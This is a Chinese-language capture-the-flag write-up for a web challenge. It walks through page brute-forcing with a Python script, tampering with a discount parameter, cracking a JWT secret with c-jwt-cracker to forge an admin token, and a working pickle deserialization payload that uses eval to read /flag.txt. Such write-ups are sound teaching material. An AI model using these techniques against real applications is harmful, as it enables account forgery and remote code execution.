考察知识点：

1.python 脚本编写

2. jwt破解

3. 



1.提示需要冲到lv6

![](images/377E6D4797724192A3C72F971257F2FBclipboard.png)



2. 发现下一页可以一直点击，推测lv6在某一页

采用脚本爆破：

因为网页中的会员等级在网页中是等级对应的图片，所以爆破脚本只需要不断获取lv6.png即可

![](images/662F526C83D0477CB6296F114D974E16clipboard.png)

```javascript
import requests

url='http://0302ff1f-762a-4a95-8aad-32d665cf5b9f.node3.buuoj.cn/shop?page='

for i in range(0,500):
    r=requests.get(url+str(i))

    print(url+str(i))
    # print(r.text)
    if "lv6.png" in r.text:
        print(i)
        break
```



最终在181页发现lv6

![](images/6C9B9966ACB64C62B488EFD6D3124BBAclipboard.png)

3.购买会员，但是发现钱不够，抓包发现可以任意更改折扣



![](images/14AE3A5D5D2043E69784725B0A2F8AA3clipboard.png)

当折扣改的足够小时，会发生302跳转，



4. 跳转的302页面，显示只允许admin用户访问，所以此时思路就是伪造成admin用户



发现传输协议中使用了jwt，jwt是不安全的

https://zhuanlan.zhihu.com/p/71672282

![](images/2A4574A1FBA34C129EF88E3AFCDD200Dclipboard.png)



5. 伪造jwt



5.1 安装jwt破解工具

```javascript
git clone https://github.com/brendan-rius/c-jwt-cracker
make
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImgxMWJhMSJ9.dZLQ2sL0AKiPll8PmCVQ4ZXiMNXT9AxYtE3U1qhDR6Y
```



![](images/04F1AB806ADB4CD387AC8B6EEE922D93clipboard.png)



5.2 伪造成admin用户

https://jwt.io/

![](images/8CAD6703FAFB41CEBA55A5B1C924AA01clipboard.png)



6. 访问刚才的后台

发现网站的源码

![](images/AF13434ECD864B799C9C011C8E717DA5clipboard.png)



7. 下载到源码发现admin.py存在反序列化

```javascript
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```



8.构造exp

```javascript
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a
```



9. 抓包发送payload

![](images/720FB7F8333A494887F7CF9DDE6D1C70clipboard.png)



![](images/58E3D562260A47AEB35615F4445B9DA0clipboard.png)

